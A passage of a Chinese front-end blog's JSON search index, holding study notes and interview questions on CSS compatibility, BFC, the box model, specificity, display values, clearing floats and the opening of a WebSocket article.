参考资料2：https://www.cnblogs.com/axl234/p/5078182.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-CSS","slug":"前端-CSS","permalink":"http://liuxuewen-site.github.io/tags/前端-CSS/"}]},{"title":"前端基础考题5","slug":"frontEnd-basic5","date":"2018-02-14T08:39:11.000Z","updated":"2019-01-25T10:04:41.440Z","comments":true,"path":"2018/02/14/frontEnd-basic5/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/14/frontEnd-basic5/","excerpt":"","text":"一、什么是优雅降级和渐进增强？ 1）优雅降级：Web站点在所有新式浏览器中都能正常工作，如果用户使用的是老式浏览器，则代码会检查以确认它们是否能正常工作。优雅降级能为那些无法支持功能的浏览器增加候选方案，使之在旧式浏览器上以某种形式降级体验却不至于完全失效. 2）渐进增强：从被所有浏览器支持的基本功能开始，逐步地添加那些只有新式浏览器才支持的功能,向页面增加无害于基础浏览器的额外样式和功能的。当浏览器支持时，它们会自动地呈现出来并发挥作用。 二、常见浏览器兼容性问题与解决方案？ 1）不同浏览器，标签默认的外补丁和内补丁不同 &emsp;问题症状：标签在不加样式控制的情况下，各自的margin和padding差异较大 &emsp;碰到频率：100% &emsp;解决方案：CSS里 * {margin:0;padding:0;} &emsp;备注：这个是最常见的浏览器兼容性问题，几乎所有CSS文件开头都会用通配符*来设置各标签的内外补丁是0 2）块标签float后，又有横行的margin情况下，在IE6显示margin比设置的大 &emsp;问题症状：常见症状是IE6中后面的一块被顶到下一行 &emsp;碰到频率：90%（稍微复杂点的页面都会碰到，float布局最常见的浏览器兼容问题） &emsp;解决方案：在float的标签样式控制中加入display:inline;将其转化为行内属性 &emsp;备注：div+CSS横向布局中我们常用div float实现，横向间距设置如果用margin，这便是一个必然会碰到的兼容性问题 3）行内标签，设置display:block后采用float布局，又有横行的margin的情况，IE6间距bug &emsp;问题症状：IE6里的间距比超过设置的间距 &emsp;碰到频率：20% &emsp;解决方案： 在display:block;后面加入display:inline;display:table; &emsp;备注：行内标签为了设置宽高，我们需要设置display:block;(除了input标签比较特殊)。在用float布局并有横向的margin后，在IE6下他就具有了块属性float后的横向margin的bug。不过因为它本身就是行内属性标签，所以我们再加上display:inline的话，它的高宽就不可设了。这时候我们还需要在display:inline后面加入display:talbe。 4）设置较小高度标签（一般小于10px），在IE6，IE7中高度超出自己设置高度 &emsp;问题症状：IE6、7标签的高度不受控制，超出自己设置的高度 &emsp;碰到频率：60% &emsp;解决方案：给超出高度的标签设置overflow:hidden;或者设置行高line-height小于你设置的高度 &emsp;备注：这种情况一般出现在我们设置小圆角背景的标签里。出现这个问题的原因是IE8之前的浏览器都会给标签一个最小默认的行高的高度。即使你的标签是空的，这个标签的高度还是会达到默认的行高。 5）图片默认有间距 &emsp;问题症状：几个img标签放在一起的时候，有些浏览器会有默认间距，加通配符也不起作用。 &emsp;碰到几率：20% &emsp;解决方案：使用float属性为img布局 &emsp;备注：因为img标签是行内属性标签，所以只要不超出容器宽度，img标签都会排在一行里，但是部分浏览器的img标签之间会有个间距。去掉这个间距使用float。 6）标签最低高度设置min-height不兼容 &emsp;问题症状：min-height本身就是一个不兼容的CSS属性，所以设置min-height时不能很好的被各个浏览器兼容 &emsp;碰到几率：5% &emsp;解决方案：如果我们要设置一个标签的最小高度200px，需要进行的设置为：{min-height:200px; height:auto !important; height:200px; overflow:visible;} &emsp;备注：在B/S系统前端，有很多情况下我们有这种需求。当内容小于一个值（如300px）时。容器的高度为300px；当内容高度大于这个值时，容器高度被撑高，而不是出现滚动条。这时候我们就会面临这个兼容性问题。 7）透明度的兼容CSS设置 &emsp;一般在ie中用的是filter:alpha(opacity=0);这个属性来设置div或者是块级元素的透明度，而在firefox中，一般就是直接使用opacity:0,对于兼容的，一般的做法就是在书写css样式的将2个都写上就行，就能实现兼容 三、性能优化的方法有哪些？ 1）使用CDN 2）减少http请求次数 3）为文件头指定Expires 4）用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能 5）将样式表放在顶部，将脚本放在底部 6）使用gzip压缩内容 7）将CSS和JS放到外部文件中 8）避免跳转 9）可缓存的AJAX 10）少用全局变量 详情请看性能优化文章 四、为什么要初始化CSS样式（重置浏览器默认样式）？ 因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，若没对CSS初始化往往会出现浏览器之间的页面显示差异。（初始化样式会对SEO有一定的影响，所以力求影响最小的情况下初始化） 方法： 1）最简单的办法：（不推荐使用）*{margin: 0;padding: 0;}。 2）使用CSSReset可以将所有浏览器默认样式设置成一样。 3）normalize：有些cssreset过于简单粗暴，有点伤及无辜，normalize是另一个选择。bootstrap引用该css来重置浏览器默认样式，比普通的cssreset要精细，保留浏览器有用的默认样式，支持包括手机浏览器在内的超多浏览器，同时对HTML5元素、排版、列表、嵌入的内容、表单和表格都进行了一般化。 五、谈谈你对CSS中刻度的认识？ CSS中刻度是用于设置元素尺寸的单位。 1）长度单位包括：相对单位（em, ex, ch, rem, vw, vh, vmax, vmin）和绝对单位（cm, mm, q, in, pt, pc, px）。 2）绝对长度单位：1in = 2.54cm = 25.4 mm = 72pt = 6pc = 96px 3）特殊值0可以省略单位。如margin:0px可以写成margin:0 4）一些属性可能允许有负长度值，或有一定的范围限制。若不支持负长度值，应变换到能够被支持的最近一个长度值 文本相对长度单位：em 相对于当前对象内文本的字体尺寸，若当前对象行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。(相对父元素的字体大小倍数) 文本相对长度单位：rem rem是CSS3新增的一个相对单位，相对于根元素(即html元素)font-size计算值的倍数。 （浏览器的默认字体大小为16像素，浏览器内置的默认样式多数是可以被修改的，但chrome不能直接修改，可以被用户样式覆盖） em与rem的重要区别在于它们计算的规则一个是依赖父元素另一个是依赖根元素计算 六、box-sizing属性的的用法？ 用来设置或检索对象的盒模型组成模式 1）box-sizing:content-box： padding和border不被包含在定义的width和height之内。对象的实际宽度等于设置的width值和border、padding之和，即 (Element width = width + border + padding，但占有页面位置还要加上margin)此属性表现为标准模式下的盒模型。 2）box-sizing:border-box： padding和border被包含在定义的width和height之内。对象的实际宽度就等于设置的width值，即使定义有border和padding也不会改变对象的实际宽度，即 (Element width = width) 此属性表现为怪异模式下的盒模型。 七、隐藏元素的方式有哪些？ 1）CSS的display:none，不会占有原来的位置 2）CSS的visibility:hidden，会占有原来的位置 3）HTML5中的新增属性hidden=”hidden”，不会占有原来的位置 八、如何解决多个元素重叠问题？ 使用z-index属性可以设置元素的层叠顺序 1）语法：z-index: auto | &emsp;&emsp;auto：元素在当前层叠上下文中的层叠级别是0。 &emsp;&emsp;整数： 用整数值来定义堆叠级别。可以为负值。 &emsp;&emsp;当多个元素层叠在一起时，数字大者将显示在上面 2）默认值：auto 3）适用于：定位元素。即定义了position为非static的元素 标注： 本文来自牛客网","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-考题","slug":"前端-考题","permalink":"http://liuxuewen-site.github.io/tags/前端-考题/"}]},{"title":"BFC","slug":"CSS-bs-bfc","date":"2018-02-08T14:10:02.000Z","updated":"2019-01-25T09:57:00.530Z","comments":true,"path":"2018/02/08/CSS-bs-bfc/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/08/CSS-bs-bfc/","excerpt":"","text":"一、什么是BFC？ BFC（Block Format Context），即块级格式化范围，是CSS2.1中用于规定块级盒子的渲染布局方式，他在计算盒子高度、margin值等地方有区别于其他环境。具有BFC特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素。 （另有IFC，对应内联格式化范围，可用来做水平居中以及垂直居中） 二、如何触发BFC？ 只要元素满足下面任一条件即可触发 BFC 特性： 1）body 根元素 2）浮动元素：float 除 none 以外的值 3）绝对定位元素：position (absolute、fixed) 4）display 为 inline-block、table-cells、flex 5）overflow 除了 visible 以外的值 (hidden、auto、scroll) 三、BFC的应用？1、避免边距重叠 1）什么是边距重叠： 所谓边距重叠即当两个元素垂直边距相互接触时，它们将合并形成一个边距，这个合并后的边距值就是这两个边距值中最大的那一个。 参加折叠的margin都是正值：取其中margin较大的值为最终margin值。 参与折叠的margin都是负值：取的是其中绝对值较大的，然后从0位置负向位移。 参与折叠的margin有正有负：先取出负margin中绝对值中大的，然后和正margin值中最大的margin相加。 2）产生边距重叠的情形： a、嵌套的父子元素 b、垂直排列的两个同级元素 3）具体例子之嵌套的父子元素： 如下，父元素没有设置margin-top，而子元素设置了margin-top：20px: 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; *&#123; margin:0; padding:0; &#125; .demo&#123; height:100px; background: #eee; &#125; .parent&#123; height:200px; background: #88f; &#125; .child&#123; height:100px; margin-top:20px; background: #0ff; width:200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;section class=\"demo\"&gt; &lt;h2&gt;此部分是能更容易看出让下面的块的margin-top。&lt;/h2&gt; &lt;/section&gt; &lt;section class = \"parent\"&gt; &lt;article class=\"child\"&gt; &lt;h2&gt;子元素&lt;/h2&gt; margin-top:20px; &lt;/article&gt; &lt;h2&gt;父元素&lt;/h2&gt; 没有设置margin-top &lt;/section&gt;&lt;/body&gt;&lt;/html&gt; 由图可以看出，父元素也一起有了边距: BFC解决方法如下： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; *&#123; margin:0; padding:0; &#125; .demo&#123; height:100px; background: #eee; &#125; .parent&#123; height:200px; background: #88f; overflow: hidden; /* 通过overflow方式形成BFC环境，内部怎么变都不影响外部 */ &#125; .child&#123; height:100px; margin-top:20px; background: #0ff; width:200px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;section class=\"demo\"&gt; &lt;h2&gt;此部分是能更容易看出让下面的块的margin-top。&lt;/h2&gt; &lt;/section&gt; &lt;section class = \"parent\"&gt; &lt;article class=\"child\"&gt; &lt;h2&gt;子元素&lt;/h2&gt; margin-top:20px; &lt;/article&gt; &lt;h2&gt;父元素&lt;/h2&gt; 没有设置margin-top &lt;/section&gt;&lt;/body&gt;&lt;/html&gt; 由图可以看出，父元素不margin了: 4）具体例子之垂直排列的两个同级元素： 如下，上元素设置了margin-bottom: 30px，下元素设置了margin-top：50px: 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; *&#123; margin:0; padding:0; &#125; .top&#123; background: #0ff; height:100px; margin-bottom:30px; &#125; .bottom&#123; height:100px; margin-top:50px; background: #ddd; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;section class=\"top\"&gt; &lt;h1&gt;上&lt;/h1&gt; margin-bottom:30px; &lt;/section&gt; &lt;section class=\"bottom\"&gt; &lt;h1&gt;下&lt;/h1&gt; margin-top:50px; &lt;/section&gt;&lt;/body&gt;&lt;/html&gt; 由图可以看出，两同级元素间的距离是50px而不是80px: BFC解决方法如下： 123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; *&#123; margin:0; padding:0; &#125; .top&#123; background: #0ff; height:100px; margin-bottom:30px; overflow: hidden; &#125; .bottom&#123; height:100px; margin-top:50px; background: #ddd; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;section class=\"top\"&gt; &lt;h1&gt;上&lt;/h1&gt; margin-bottom:30px; &lt;/section&gt; &lt;div style=\"overflow:hidden\"&gt; &lt;!-- 给下面这个块添加一个父元素，在父元素上创建bfc --&gt; &lt;section class=\"bottom\"&gt; &lt;h1&gt;下&lt;/h1&gt; margin-top:50px; &lt;/section&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 由图可以看出，间距变成了80px: 2、阻止元素被浮动元素覆盖 我们知道浮动元素会脱离文档流，然后浮盖在文档流元素上: 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"height: 100px;width: 100px;float: left;background: lightblue\"&gt; 我是一个左浮动的元素 &lt;/div&gt; &lt;div style=\"width: 200px; height: 200px;background: #eee\"&gt; 我是一个没有设置浮动, 也没有触发 BFC 元素, width: 200px; height:200px; background: #eee; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 由图可以看出，第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖): BFC解决方法如下： 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"height: 100px;width: 100px;float: left;background: lightblue\"&gt; 我是一个左浮动的元素 &lt;/div&gt; &lt;!-- 给第二个元素中加入overflow: hidden创建bfc --&gt; &lt;div style=\"width: 200px; height: 200px;background: #eee; overflow: hidden\"&gt; 我是一个没有设置浮动, 也没有触发 BFC 元素, width: 200px; height:200px; background: #eee; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 由图可以看出，浮动不覆盖了: 3、防止高度塌陷（清除浮动） 我们都知道，浮动的元素会脱离普通文档流： 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"border: 1px solid #000;\"&gt; &lt;div style=\"width: 100px;height: 100px;background: #eee;float: left;\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 由图可以看出，由于容器内元素浮动，脱离了文档流，所以容器只剩下2px的边距高度: BFC解决方法如下： 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 给父元素中加入overflow: hidden创建bfc --&gt; &lt;div style=\"border: 1px solid #000;overflow: hidden\"&gt; &lt;div style=\"width: 100px;height: 100px;background: #eee;float: left;\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 由图可以看出，高度呈现了: 标注： 参考资料1：https://zhuanlan.zhihu.com/p/25321647 参考资料2：https://www.cnblogs.com/chengzp/p/cssbox.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-CSS","slug":"前端-CSS","permalink":"http://liuxuewen-site.github.io/tags/前端-CSS/"}]},{"title":"前端基础考题4","slug":"frontEnd-basic4","date":"2018-02-07T14:20:30.000Z","updated":"2019-01-25T10:02:45.159Z","comments":true,"path":"2018/02/07/frontEnd-basic4/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/07/frontEnd-basic4/","excerpt":"","text":"一、解释一下CSS的盒子模型？ 1、基本概念 CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括：边距，边框，填充，和实际内容。 盒模型有两种标准的，一个是标准模型，一个是IE模型。 从上图可看出在标准模型中， 标准模型宽= content + padding-(left and right) + border-(left and right) + margin-(left and right)（高同样）， 内容宽= content（高同样）。 IE模型的宽= content + padding-(left and right) + border-(left and right) + margin-(left and right)（高同样）， 内容的宽= content + padding-(left and right) + border-(left and right)（高同样）。 2、css如何设置两种模型 这里用到了CSS3 的属性 box-sizing 12345/* 标准模型 */box-sizing:content-box;/*IE模型*/box-sizing:border-box; 3、JS获取宽高 通过JS获取盒模型对应的宽和高，有以下几种方法（以下用dom来表示获取的HTML的节点）： 1）dom.style.width/height 这种方式只能取到dom元素内联样式所设置的宽高，也就是说如果该节点的样式是在style标签中或外联的CSS文件中设置的话，通过这种方法是获取不到dom的宽高的。 2）dom.currentStyle.width/height 这种方式获取的是在页面渲染完成后的结果，就是说不管是哪种方式设置的样式，都能获取到。 但这种方式只有IE浏览器支持。 3）window.getComputedStyle(dom).width/height 这种方式的原理和2是一样的，这个可以兼容更多的浏览器，通用性好一些。 4）dom.getBoundingClientRect().width/height 这种方式是根据元素在视窗中的绝对位置来获取宽高的 5）dom.offsetWidth/offsetHeight 这个就没什么好说的了，最常用的，也是兼容最好的。 关于CSS盒模型，更多相关请看BFC文章 二、CSS选择器的类型有哪些？ 1）基础选择器： 2）组合选择器： 3）属性选择器： 4）伪类： 5）伪元素： 三、说说CSS的特殊性?（优先级、计算特殊值） 优先级 1）同类型，同级别的样式后者先于前者 2）内联 &gt; ID选择器 &gt; 伪类 &gt; 属性选择器 &gt; 类选择器 &gt; 标签选择器 &gt; 通用选择器(*) &gt; 继承的样式 3）内嵌样式 &gt; 内部样式表 &gt; 外联样式表 （近的 &gt; 远的） &emsp;&emsp;内嵌样式：内嵌在元素中，&lt; span style=”color:red” >&lt; /span > &emsp;&emsp;内部样式表：在页面中的样式，写在&lt; style >&lt; /style >中的样式 &emsp;&emsp;外联样式表：单独存在一个css文件中，通过link引入或import导入的样式 4）!important 权重最高，比 inline style 还要高 5）具体 &gt; 泛化的，特殊性即css优先级 计算特殊性值 因为：important &gt; 内嵌 &gt; ID &gt; 类 &gt; 标签 | 伪类 | 属性选择 &gt; 伪对象 &gt; 继承 &gt; 通配符 所以：权重、特殊性计算法如下： 1）CSS样式选择器分为4个等级，a、b、c、d 2）如果样式是行内样式，那么a=1，1,0,0,0 2）b为ID选择器的总数 0,1,0,0 3）c为属性选择器，伪类选择器和class类选择器的数量。0,0,1,0 4）d为标签、伪元素选择器的数量 0,0,0,1 5）!important 权重最高，比 inline style 还要高 6）比如结果为：1093比1100，按位比较，从左到右，只要一位高于则立即胜出，否则继续比较。 四、如何动态改变层中的内容？ 可使用innerHTML 或 innerText； 1）innerHTML指的是从起始位置到终止位置的全部内容,包括Html标签。 2）innerText指的是从起始位置到终止位置的内容,但它去除Html标签。 innerHTML是所有浏览器都支持的，innerText是IE和chrome支持的，Firefox不支持。其实，innerHTML是W3C 组织规定的属性；而innerText是IE浏览器自己的属性，只是后来的浏览器部分实现了这个属性。 五、列出display的值并说明他们的作用？ 1）none：隐藏对象。与visibility属性的hidden值不同，其不为被隐藏的对象保留其物理空间 2）list-item：指定对象为列表项目。 3）inline：指定对象为内联元素。 4）block：指定对象为块元素。 5）inline-block：指定对象为内联块元素。（CSS2） 6）table：指定对象作为块元素级的表格。类同于html标签&lt; table >（CSS2） 7）inline-table：指定对象作为内联元素级的表格。类同于html标签&lt; table >（CSS2） 8）table-caption：指定对象作为表格标题。类同于html标签&lt; caption >（CSS2） 9）table-cell：指定对象作为表格单元格。类同于html标签&lt; td >（CSS2） 10）table-row：指定对象作为表格行。类同于html标签&lt; tr >（CSS2） 11）table-column：指定对象作为表格列。类同于html标签&lt; col >（CSS2） 12）table-row-group：指定对象作为表格行组。类同于html标签&lt; tbody >（CSS2） 13）table-column-group：指定对象作为表格列组显示。类同于html标签&lt; colgroup >（CSS2） 14）table-header-group：指定对象作为表格标题组。类同于html标签&lt; thead >（CSS2） 15）table-footer-group：指定对象作为表格脚注组。类同于html标签&lt; tfoot >（CSS2） 16）run-in：根据上下文决定对象是内联对象还是块级对象。（CSS3） 17）box：将对象作为弹性伸缩盒显示。（伸缩盒最老版本）（CSS3） 18）inline-box：将对象作为内联块级弹性伸缩盒显示。（伸缩盒最老版本）（CSS3） 19）flexbox：将对象作为弹性伸缩盒显示。（伸缩盒过渡版本）（CSS3） 20）inline-flexbox：将对象作为内联块级弹性伸缩盒显示。（伸缩盒过渡版本）（CSS3） 21）flex：将对象作为弹性伸缩盒显示。（伸缩盒最新版本）（CSS3） 22）inline-flex：将对象作为内联块级弹性伸缩盒显示。（伸缩盒最新版本）（CSS3） 特别说明（可作为内联元素与块元素的区别）： 1）display:inline a、inline元素不会独占一行，多个相邻的行内元素会排列在同一行里，直到一行排列不下，才会新换一行，其宽度随元素的内容而变化。 b、inline元素设置width,height属性无效。 c、inline元素的margin和padding属性，水平方向的padding-left, padding-right, margin-left, margin-right都产生边距效果；但竖直方向的padding-top, padding-bottom, margin-top, margin-bottom不会产生边距效果。 2）display:block： a、block元素会独占一行，多个block元素会各自新起一行。默认情况下，block元素宽度自动填满其父元素宽度。 b、block元素可以设置width,height属性。块级元素即使设置了宽度,仍然是独占一行。 c、block元素可以设置margin和padding属性。 3）display:inline-block a、将对象呈现为inline对象，但对象的内容作为block对象呈现，之后的内联对象会被排列在同一行内。比如可以给一个link（a元素）inline-block属性值，使其既具有block的宽度高度特性又具有inline的同行特性。 b、IE（低版本）本来是不支持inline-block的，所以在IE中对内联元素使用display:inline-block，理论上IE是不识别的，但使用display:inline-block在IE下会触发layout，从而使内联元素拥有了display:inline-block属性的表象。 六、如何居中一个（非）浮动元素? 1）非浮动元素：设置margin:0 auto；定位；父级元素text-align:center等 2）浮动元素: &emsp;方法一:设置当前div的宽度，然后设置margin-left:50%; position:relative; left:-250px;其中的left是宽度的一半 &emsp;方法二:父元素和子元素同时左浮动，然后父元素相对左移动50%，再然后子元素相对左移动-50% &emsp;方法三:position定位等。 七、浮动及浮动元素会引起的问题？ 浮动： 使元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框会停留。 问题： 1）父元素的高度无法被撑开，影响与父元素同级的元素 2）与浮动元素同级的非浮动元素会跟随其后，影响与浮动元素同级的元素 3）第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构 八、清除浮动的方法？ 1）父级div定义 height 123456789101112131415161718&lt;style type=\"text/css\"&gt; .div1&#123; background:#000080; border:1px solid red; /*解决代码*/ height:200px; &#125; .div2&#123;background:#800080;border:1px solid red;height:100px;margin-top:10px&#125; .left&#123;float:left;width:20%;height:200px;background:#DDD&#125; .right&#123;float:right;width:30%;height:80px;background:#DDD&#125;&lt;/style&gt;&lt;div class=\"div1\"&gt; &lt;div class=\"left\"&gt;Left&lt;/div&gt; &lt;div class=\"right\"&gt;Right&lt;/div&gt;&lt;/div&gt;&lt;div class=\"div2\"&gt; div2&lt;/div&gt; 原理：父级div手动定义height，就解决了父级div无法自动获取到高度的问题。 优点：简单、代码少、容易掌握 缺点：只适合高度固定的布局，要给出精确的高度，如果高度和父级div不一样时，会产生问题 建议：不推荐使用，只建议高度固定的布局时使用 2）结尾处加空div标签 clear:both 123456789101112131415161718&lt;style type=\"text/css\"&gt; .div1&#123;background:#000080;border:1px solid red&#125; .div2&#123;background:#800080;border:1px solid red;height:100px;margin-top:10px&#125; .left&#123;float:left;width:20%;height:200px;background:#DDD&#125; .right&#123;float:right;width:30%;height:80px;background:#DDD&#125; /*清除浮动代码*/ .clearfloat&#123; clear:both &#125;&lt;/style&gt;&lt;div class=\"div1\"&gt; &lt;div class=\"left\"&gt;Left&lt;/div&gt; &lt;div class=\"right\"&gt;Right&lt;/div&gt; &lt;div class=\"clearfloat\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=\"div2\"&gt; div2&lt;/div&gt; 原理：加上一个没有脱离文档流的具有高度的子元素能触发父元素的高度。添加一个空div，设置clear:both是清除新增的空div的浮动，让父级div能自动获取到高度 优点：简单、代码少、浏览器支持好、不容易出现怪问题 缺点：不少初学者不理解原理；如果页面浮动布局多，就要增加很多空div，让人感觉很不好 建议：不推荐使用，但此方法是以前主要使用的一种清除浮动方法 3）父级div定义 伪类:after 和 zoom 123456789101112131415161718192021222324&lt;style type=\"text/css\"&gt; .div1&#123;background:#000080;border:1px solid red;&#125; .div2&#123;background:#800080;border:1px solid red;height:100px;margin-top:10px&#125; .left&#123;float:left;width:20%;height:200px;background:#DDD&#125; .right&#123;float:right;width:30%;height:80px;background:#DDD&#125; /*清除浮动代码*/ .clearfloat:after&#123; display:block; clear:both; content:\"\"; visibility:hidden; height:0 &#125; .clearfloat&#123; zoom:1 &#125;&lt;/style&gt;&lt;div class=\"div1 clearfloat\"&gt; &lt;div class=\"left\"&gt;Left&lt;/div&gt; &lt;div class=\"right\"&gt;Right&lt;/div&gt;&lt;/div&gt;&lt;div class=\"div2\"&gt; div2&lt;/div&gt; 原理：IE8以上和非IE浏览器才支持:after，原理和方法2有点类似，zoom(IE转有属性)可解决ie6,ie7浮动问题 优点：浏览器支持好、不容易出现怪问题（目前：大型网站都有使用，如：腾迅，网易，新浪等等） 缺点：代码多、不少初学者不理解原理，要两句代码结合使用才能让主流浏览器都支持。 建议：推荐使用，建议定义公共类，以减少CSS代码。 4）父级div定义 overflow:hidden 12345678910111213141516171819&lt;style type=\"text/css\"&gt; .div1&#123; background:#000080; border:1px solid red; /*解决代码*/ width:98%; overflow:hidden &#125; .div2&#123;background:#800080;border:1px solid red;height:100px;margin-top:10px;width:98%&#125; .left&#123;float:left;width:20%;height:200px;background:#DDD&#125; .right&#123;float:right;width:30%;height:80px;background:#DDD&#125;&lt;/style&gt;&lt;div class=\"div1\"&gt; &lt;div class=\"left\"&gt;Left&lt;/div&gt; &lt;div class=\"right\"&gt;Right&lt;/div&gt;&lt;/div&gt;&lt;div class=\"div2\"&gt; div2&lt;/div&gt; 原理：使用overflow:hidden时，浏览器会自动检查浮动区域的高度(必须定义width或zoom:1，同时不能定义height) 优点：简单、代码少、浏览器支持好 缺点：不能和position配合使用，因为超出的尺寸的会被隐藏。 建议：只推荐没有使用position或对overflow:hidden理解比较深的朋友使用。 5）父级div定义 overflow:auto 12345678910111213141516171819&lt;style type=\"text/css\"&gt; .div1&#123; background:#000080; border:1px solid red; /*解决代码*/ width:98%; overflow:auto &#125; .div2&#123;background:#800080;border:1px solid red;height:100px;margin-top:10px;width:98%&#125; .left&#123;float:left;width:20%;height:200px;background:#DDD&#125; .right&#123;float:right;width:30%;height:80px;background:#DDD&#125;&lt;/style&gt;&lt;div class=\"div1\"&gt; &lt;div class=\"left\"&gt;Left&lt;/div&gt; &lt;div class=\"right\"&gt;Right&lt;/div&gt;&lt;/div&gt;&lt;div class=\"div2\"&gt; div2&lt;/div&gt; 原理：使用overflow:auto时，浏览器会自动检查浮动区域的高度(必须定义width或zoom:1，同时不能定义height) 优点：简单、代码少、浏览器支持好 缺点：内部宽高超过父级div时，会出现滚动条。 建议：不推荐使用，如果你需要出现滚动条或者确保你的代码不会出现滚动条就使用吧。 标注： 本文来自牛客网，第一点改自 https://www.cnblogs.com/chengzp/p/cssbox.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-考题","slug":"前端-考题","permalink":"http://liuxuewen-site.github.io/tags/前端-考题/"}]},{"title":"webSocket","slug":"network-bs-webSocket","date":"2018-02-07T02:19:04.000Z","updated":"2019-01-25T10:16:13.562Z","comments":true,"path":"2018/02/07/network-bs-webSocket/","link":"","permalink":"http://liuxuewen-site.github.io/2018/02/07/network-bs-webSocket/","excerpt":"","text":"一、前景-http协议 B/S架构（即浏览器和服务器结构）的系统多使用HTTP协议，HTTP协议的特点： 1） 无状态协议（即不具备保存之前发送过的请求或响应的功能） 2） 用于通过 Internet 发送请求消息和响应消息 3） 使用端口接收和发送消息，默认为80端口 4） 底层通信还是使用Socket完成 HTTP协议只支持请求响应模式,即通信只能由客户端发起。优点是可以简化Web服务器，减少服务器的负担，加快响应速度，因为服务器不需要与客户端长时间建立一个通信链接。缺点是不容易实现实时的消息推送功能，如聊天室、后台信息提示、实时更新数据等功能。一些变相的解决办法如下二。 二、前景-消息推送1、轮询（http) 定义：客户端定时向服务器发送Ajax请求，服务器接到请求后马上返回响应信息并关闭连接。 优点：后端程序编写比较容易。 缺点：请求中有大半是无用，浪费带宽和服务器资源（因为必须不停连接，或者HTTP连接始终打开）。 实例：适于小型应用。 2、长轮询（http) 定义：客户端向服务器发送Ajax请求，服务器接到请求后hold住连接，直到有新消息才返回响应信息并关闭连接，客户端处理完响应信息后再向服务器发送新的请求。 优点：在无消息的情况下不会频繁的请求，耗费资小。 缺点：服务器hold连接会消耗资源，返回数据顺序无保证，难于管理维护。 实例：WebQQ、 Hi 网页版、 Facebook IM 。 3、长连接（http) 定义：在页面里嵌入一个隐蔵iframe，将这个隐蔵iframe的src属性设为对一个长连接的请求或是采用xhr请求，服务器端就能源源不断地往客户端输入数据。 优点：消息即时到达，不发无用请求；管理起来也相对便。 缺点：服务器维护一个长连接会增加开销。 实例：Gmail聊天 4、Flash Socket（socket） 定义：在页面中内嵌入一个使用了Socket类的Flash程序，JavaScript通过调用此Flash程序提供的Socket接口与服务器端的Socket接口进行通信，JavaScript在收到服务器端传送的信息后控制页面的显示。 优点：实现真正的即时通信，而不是伪即时。 缺点：客户端必须安装Flash插件；非 HTTP 协议，无法自动穿越防火墙。 实例：网络互动游戏。 5、Websocket（socket） 看下三。 三、WebSocket1、简介 WebSocket协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。 HTML5提供的WebSocket是一种浏览器与服务器间进行全双工通讯的网络技术。可实现客户端和服务器端的长连接，双向实时通信。 特点： 